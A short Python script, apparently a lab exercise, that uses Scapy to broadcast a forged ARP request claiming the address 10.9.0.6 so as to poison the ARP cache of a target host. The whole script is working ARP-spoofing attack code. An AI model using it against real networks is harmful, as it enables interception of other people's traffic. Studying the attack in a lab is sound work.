from scapy.all import *

target_ip = "10.9.0.5"
spoofed_ip = "10.9.0.6"
attacker_mac = "02:42:0a:09:00:69"

Epkt = Ether(dst="ff:ff:ff:ff:ff:ff")
Arppkt = ARP(
	op=1, 		# 1 for ARP request
	psrc=spoofed_ip, 	# source ip 
	pdst=target_ip, 	# dst ip
	hwdst=attacker_mac	# dst MAC
)

pkt= Epkt/Arppkt
sendp(pkt, iface="eth0")
print(f"Sent ARP request for {target_ip} using ip address {spoofed_ip} and MAC address {attacker_mac}")
